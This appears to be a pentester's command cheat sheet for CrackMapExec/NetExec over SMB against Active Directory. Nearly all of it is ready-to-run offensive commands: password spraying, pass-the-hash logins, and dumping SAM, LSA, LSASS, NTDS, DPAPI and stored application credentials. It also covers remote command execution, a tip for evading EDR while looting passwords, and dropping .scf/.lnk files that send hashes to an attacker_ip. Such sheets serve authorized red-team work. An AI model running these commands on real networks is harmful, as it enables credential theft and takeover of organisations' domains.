# cme (SMB)

% cme, crackmapexec, Active Directory, nxc, netexec, smb


## Enumerate SMB reachable hosts
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate network hosts that can be reached via SMB.

```bash
cme smb <ip>
```

## Enumerate ADCS CA
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate RPC endpoints to find ADCS CAs.

```bash
cme smb <ip> -M enum_ca
```

## Enumerate password policy
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate the domain password policy.

```bash
cme smb <dc-ip> -u <user> -p <password> --pass-pol
```

## Enumerate domain users anonymously
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Enumerate domain users through a null session.

```bash
cme smb <dc-ip> -u '' -p '' --users
```

## Enumerate domain users by RID bruteforce
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate domain users by bruteforcing the RID.

```bash
cme smb <ip> -u <user> -p <password> --rid-brute
```

## Enumerate domain users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate domain users.

```bash
cme smb <dc-ip> -u <user> -p <password> --users
```

## Enumerate null session
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the target accepts authentication via a null session.

```bash
cme smb <ip> -u '' -p ''
```

## Enumerate guest logon
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous

Check if the remote target accepts authentication via a Guest session.

```bash
cme smb <ip> -u 'a' -p ''
```

## Enumerate SMB target not signed
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line.

```bash
cme smb <ip> --gen-relay-list smb_not_signed.list
```

## Enumerate logged-on users
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate logged users on the remote target.

```bash
cme smb <ip> -u <user> -p <password> --loggedon-users
```

## Enumerate logged-on users with Remote Registry Service
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate logged users on the remote target through the Remote Registry Service.

```bash
cme smb <ip> -u <user> -p <password> --reg-sessions
```

## Enumerate active SMB sessions
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate active SMB sessions (including RPC/DCOM over named pipes) on the remote target.

⚠️ Requirement : Most often requires admin privileges (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --smb-sessions
```

## Enumerate active Windows sessions
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate active Windows sessions (created  when a user accesses the Windows GUI interface via a local or RDP connection) on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --qwinsta
```

## Enumerate local groups
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate local groups on the remote target.

```bash
cme smb <ip> -u <user> -p <password> --local-groups
```

## Enumerate shares
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate permissions on all shares. Filter by readable or writable.

```bash
cme smb <ip> -u <user> -p <password> --shares --filter-shares READ WRITE
```

## Enumerate disks
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate disks on the remote target.

```bash
cme smb <ip> -u <user> -p <password> --disks
```

## Enumerate WebDav
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate if the WebDav service is running on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -M webdav
```

## Enumerate Spooler
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate if the Spooler service is running on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -M spooler
```

## Enumerate AV & EDR
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 

Enumerate Anti-virus and EDR services runnign on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -M enum_av
```

## Enumerate SCCM - PSS & DP
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user

Enumerate information from Primary Site Servers and Distribution Points of an SCCM infrastructure through WINREG.

```bash
cme smb <ip> -u <user> -p <password> -M sccm-recon6
```

## Enumerate UAC status
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 

Enumerate UAC status on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M uac
```

## Enumerate BitLocker
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 

Enumerate BitLocker status on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M bitlocker
```

## Enumerate DNS entries
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 

Enumerate ADIDNS entries.

⚠️ Requirement : Domain admin privileges.

```bash
cme smb <ip> -u <user> -p <password> -M enum_dns
```

## Enumerate network interfaces
#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin

Enumerate network interfaces on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M enum_interfaces
```

## Password spray (user=password)
#assessment/AD #attack_type/Bruteforce #port/445 #port/139 #protocol/smb #access/Anonymous

Password spray to find domain accounts with user=password.

```bash
cme smb <dc-ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## Password spray multiple test 
#assessment/AD #attack_type/Bruteforce #port/445 #protocol/smb #access/Anonymous

Password spray to find domain accounts with weak passwords.

(careful on lockout)

```bash
cme smb <dc-ip> -u <users.list> -p <password.txt> --continue-on-success
```

## NoPac
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Check if the Domain Controller is vulnerable to noPac.

```bash
cme smb <dc-ip> -u <user> -p <password> -M nopac
```

## ZeroLogon
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 

Check if the Domain Controller is vulnerable to ZeroLogon.

```bash
cme smb <dc-ip> -M zerologon
```

## PrintNightmare
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Check if the targeted host is vulnerable to PrintNightmare.

```bash
cme smb <ip> -u <user> -p <password> -M printnightmare
```

## DropTheMic
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Check if the targeted host is vulnerable to DropTheMic.

```bash
cme smb <ip> -u <user> -p <password> -M remove-mic
```

## MS17-010 (EternalBlue)
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 

Check if the targeted host is vulnerable to MS17-010 (EternalBlue).

```bash
cme smb <ip> -M ms17-010
```

## SMBGhost
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 

Check if the targeted host is vulnerable to SMBGhost.

```bash
cme smb <ip> -M smbghost
```

## Coerce
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Check for coerce vulnerabilities such as PetitPotam, DFSCoerce, PrinterBug, MSEven and ShadowCoerce.

```bash
cme smb <ip> -u <user> -p <password> -M coerce_plus
```

## GPP Autologin
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Searches the Domain Controller for registry.xml to find autologon information and returns the username and password.

```bash
cme smb <ip> -u <user> -p <password> -M gpp_autologin
```

## GPP Password
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 

Retrieves plaintext passwords and other information for accounts pushed through Group Policy Preferences.

```bash
cme smb <ip> -u <user> -p <password> -M gpp_password
```

## Impersonate
#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Admin

List and impersonate windows tokens to run command as locally logged on users.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M impersonate
```

## Check NTLMv1
#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin

Check if ntlmv1 is enabled.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M ntlmv1
```

## Check AlwaysInstallElevated
#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin

Check if AlwaysInstallElevated is enabled.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M install_elevated
```

## Check RunAsPPL
#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin

Check if RunAsPPL is enabled.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M runasppl
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a domain account on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a domain account using the hash on the remote target.

```bash
cme smb <ip> -u <user> -H <hash> -d <domain>
```

## Domain auth with PFX certificate
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a domain account using the hash on the remote target.

```bash
cme smb <ip> -u <user> -d <domain> --pfx-cert <pfx-file> 
```

## Local auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Local_user

Authenticate via a local account using the hash on the remote target.

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via Kerberos on the remote target.

```bash
cme smb <ip> -u <user> -p <password> -k
```

## Kerberos CCACHE auth
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate via a Kerberos credential cache file on the remote target (in S4U2 attacks, the username must be "targeted_user@delegated_machine").

Previously import ticket : 
    $ export KRB5CCNAME=ticket.ccache

```bash
cme smb <ip> -u <user> -k --use-kcache
```

## Delegated auth (RBCD)
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user

Execute RBCD and impersonate a user through msDS-AllowedToActOnBehalfOfOtherIdentity.

⚠️ Requirement : msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to a controlled domain account

```bash
cme smb <ip> -u <user> -p <password> --delegate <impersonated_user>
```

## Delegated auth (S4U2Self)
#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_computer

Execute S4U2Self and impersonate a user through msDS-AllowedToActOnBehalfOfOtherIdentity.

⚠️ Requirement : msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to a controlled domain account

```bash
cme smb <ip> -u <computer$> -H <hash> --delegate <impersonated_user> --self
```

## Dump SAM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump SAM hashes using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --sam
```

## Dump LSA
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa
```

## Dump LSA (old method)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump LSA secrets using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> --lsa secdump
```

## Dump LSASS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from LSASSY.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M lsassy
```

## Dump LSASS (Nanodump)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from Nanodump.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M nanodump
```

## Dump LSASS (Procdump)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from Procdump.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M procdump
```

## Dump LSASS (Handlekatz)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from Handlekatz64 and pypykatz.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M handlekatz
```

## Dump LSASS - with bloodhound update
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump secrets from the LSASS process memory using methods from LSASSY and update BloodHound.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -H <hash> --local-auth -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## Dump Security questions
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump local users security questions.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M security-questions
```

## Dump NTDS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the NTDS.dit using methods from secretsdump.py.

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> --ntds
```

## Dump NTDS (ntdsutil)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the NTDS.dit using methods from ntdsutil.

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> -M ntdsutil
```

## Dump NTDS (raw)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the NTDS.dit, SAM and SYSTEM files by accessing the raw hard drive.

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> -M ntds-dump-raw
```

## Dump DPAPI
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi
```

## Dump DPAPI NoSystem (avoid EDR trigger)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.
Won't collect system credentials. This will prevent EDR from stopping you from looting passwords.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> --dpapi nosystem
```

## Dump Entra ID Sync
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Extract Entra ID sync credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M entra-sync-creds
```

## Dump Masky
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump domain user credentials via an ADCS and a KDC.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M masky -o CA=<domain>\<domain-host-CA>
```

## Dump PowerShell history
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Extract PowerShell history for all users and looks for sensitive commands.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M powershell_history
```

## Dump IIS
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump credentials in IIS Application Pool configuration files using appcmd.exe.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M iis
```

## Dump Autologon
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump autologon credentials stored in the registry.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M reg-winlogon
```

## Dump CLPA logs
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump clear-text credentials passed in command lines which are logged in Windows Event ID 4688.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <dc-ip> -u <user> -p <password> -M eventlog_creds
```

## Dump NTP computer hashes (TimeRoast)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump password hashes of any computer or trust account using Windows NTP authentication.

```bash
cme smb <ip> -u <user> -p <password> -M timeroast
```

## Dump WIFI password
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the WIFI password register in Windows.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M wifi
```

## Dump WinSCP
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump WinSCP secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M winscp
```

## Dump PuTTY
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump users private keys stored by PuTTY for remote connections (e.g. SSH).

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M putty
```

## Dump VNC
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump users credentials stored by RealVNC or TightVNC for remote connections.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M vnc
```

## Dump RDCMan (Remote Desktop Connection Manager)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump Remote Desktop Connection Manager credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M rdcman
```

## Dump mRemoteNG
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump mRemoteNG credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M mremoteng
```

## Dump MobaXterm
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump MobaXterm credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M mobaxterm
```

## Dump Notepad
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump unsaved Notepad documents and parse for potential credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M notepad
```

## Dump Notepad++
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump unsaved Notepad++ documents and parse for potential credentials.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M notepad++
```

## Dump Recycle Bins
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump users' recycle bins.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M recyclebin
```

## Dump recently modified files
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump a list of users' recently modified files.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M recent_files
```

## Dump WAM (Token Broker Cache)
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump and decrypt access token from the Token Broker Cache.

Microsoft 365 and Azure applications on desktop will store access tokens to the Token Broker Cache. These are stored with user DPAPI.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M wam
```

## Dump AWS secrets
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Search for AWS credential files.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M aws-credentials
```

## Dump SCCM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump the SCCM using methods from dploot.

⚠️ Requirement : Domain admin or Local admin privileges on target Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> --sccm
```

## Dump MSOL
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin

Dump MSOL accounts cleartext password from the localDB on the Azure AD-Connect Server.

⚠️ Requirement : Domain admin or Local admin privileges on target Domain Controller

```bash
cme smb <dc-ip> -u <user> -p <password> -M msol
```

## Dump VEEAM
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin

Dump the VEEAM credentials from the VEEAM server SQL database.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M veeam
```

## Dump with BackupOperator priv
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user

Dump SAM, SYSTEM, SECURITY (and the NTDS.dit on DC) on the remote target.

⚠️ Requirement : Controlled user has SeBackupPrivilege. No admin privs needed.

```bash
cme smb <ip> -u <user> -p <password> -M backup_operator
```

## Enable wdigest
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user

Enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <ip> -u <user|Administrator> -p <password> --local-auth --wdigest enable
```

## Loggout user
#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #warning/modify_target #access/Domain_user

Can be useful after enable wdigest to force user to reconnect.

```bash
cme smb <ip> -u <user> -p <password> -x 'quser'
cme smb <ip> -u <user> -p <password> -x 'logoff <id_user>' --no-output
```

## Execute remote commands (CMD)
#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user

Execute remote commands through Windows CMD.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user

Execute remote commands through Windows PowerShell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -X <command>
```

## Execute remote commands with a specific method
#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user

Execute remote commands through Windows CMD using a specific execution method (wmiexec, atexec, smbexec).

⚠️ Requirement : Use --local-auth if the user is a local account

```bash
cme smb <ip> -u <user> -p <password> -x <command> --exec-method <method>
```

## Execute remote commands through Scheduled Tasks
#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Admin

Execute remote commands on behalf of another user with an active session on the remote target, through Scheduled Tasks.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<command>
```

## Execute remote commands through Process Injection
#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Admin

Execute remote commands on behalf of another user with an active session on the remote target, through Process Injection.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M pi -o PID=<target_process_pid> EXEC=<command>
```

## Scuffy (.scf file in share)
#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin

Drop a .scf file in all writeable shares to trigger a SMB authentication (or at least a NTLMv2 hash disclosure).

```bash
cme smb <ip> -u <user> -p <password> -M scuffy -o NAME=.thumbs.db SERVER=<attacker_ip>
```

## Slinky (.lnk file in share)
#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin

Drop a .lnk file in all writeable shares to trigger a SMB authentication (or at least a NTLMv2 hash disclosure).

```bash
cme smb <ip> -u <user> -p <password> -M slinky -o NAME=.thumbs.db SERVER=<attacker_ip>
```

## Clean up Scuffy/Slinky
#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin

Clean up all .scf files dropped with scuffy in all writeable shares.

```bash
cme smb <ip> -u <user> -p <password> -M <scuffy_or_slinky> -o NAME=.thumbs.db CLEANUP=true
```

## Add a domain computer
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Allow to add a domain computer account.

```bash
cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> PASSWORD=<machine_password>
```

## Delete a domain computer
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Allow to delete a domain computer account.

```bash
cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> DELETE=True
```

## Change a domain user password
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Allow to change a domain user's password. Valuable if the actual password has expired and must be changed (authentication status : STATUS_PASSWORD_MUST_CHANGE).
(Notify the client about changing a user's password)

⚠️ Requirement : Knowledge of the targeted account's actual password.

```bash
cme smb <ip> -u <user> -p <password> -M change-password -o NEWPASS=<newpass>
```

## Download SnippingTool screenshots
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Download screenshots taken by the (new) Snipping Tool on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M snipped
```

## KeePass discover
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Search for KeePass-related files and process on the remote target.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M keepass_discover
```

## Generate KRB5.conf file
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Generate a Kerberos configuration file for a given user.

```bash
cme smb <ip> -u <user> -p <password> --generate-krb5-file <path>
export KRB5_CONFIG=<path>
```

## Generate TGT (.ccache file)
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Generate a Kerberos TGT as a .ccache file for a given user.

```bash
cme smb <ip> -u <user> -p <password> --generate-tgt <path>
export KRB5CCNAME=<path>
```

## Enable/disable RDP
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Enable/disable RDP.
ACTION values :
    - enable (default)
    - enable-ram
    - disable
    - disable-ram

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M rdp -o ACTION=<action>
```

## Enable/disable RDP shadowing
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Enable/disable RDP shadowing.
ACTION values :
    - enable
    - disable

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme smb <ip> -u <user> -p <password> -M shadowrdp -o ACTION=<action>
```

## List files in shares
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Spider shares files on a remote target. Search can be filter by file extension.

```bash
cme smb <ip> -u <user> -p <password> --spider <share> --pattern <file_extension>
```

## Put file
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Send a local file to the remote target.

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## Get file
#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user

Get a local file from the remote target.

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= method: wmiexec
= share: C\$
= scuffy_or_slinky: scuffy
